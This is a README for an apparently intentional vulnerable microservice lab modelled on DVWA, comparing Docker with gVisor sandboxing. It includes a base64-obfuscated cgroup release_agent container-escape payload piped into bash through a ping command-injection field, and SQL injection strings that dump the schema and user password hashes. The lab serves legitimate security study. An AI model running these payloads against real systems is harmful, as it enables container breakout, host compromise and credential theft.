# vulnerable-microservice-web-app
A microservice web app to mimic the features of DVWA.
Currently available features : 1) Command Injection (ping) and 2) Blind SQL Injection

# To build images
`./build-images.sh`
# To run application
`docker-compose up -d`
# To load the tables
`./reset-db.sh` \
\
The tables must be loaded once the containers have been brought up.\
The same command can be used to reset the tables if any sql-injection actions have been performed
# Containers : 
- ping [a flask app that executes ping/command injection(Standard Docker)]
- ping-gvisor [a flask app that executes ping/command injection(gVisor)]
- sql-injection [a flask app that connects to mysql container and executes sql commands]
- nginx [an nginx container that hosts the frontend UI]
- mysql [a mysql container. version 5.5.23]
# To use application
Go to localhost:1234 [0.0.0.0:1234]
# Test command injection with a container breakout exploit
https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/ \
enter payload in ping section:\
`127.0.0.1 && echo 'cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAicHJvZml0Ig=='|base64 -d|bash -`\
When payload sent to Standard Docker ping, it returns ps command results from host system. \
When payload sent to gVisor ping, it fails to execute as gVisor is secure.
# SQL Injection
The input is not sanitised so we can execute other instructions.\
Try the following commands in the sql injection text box : 
- `1 or '0'='0' union select TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS #` \
The above command returns all column names of all the tables in each database in the container.
- `1 or '0'='0' union select user, password from dvwa.users #` \
The above command returns username and md5 hashed password of each user int he uses table.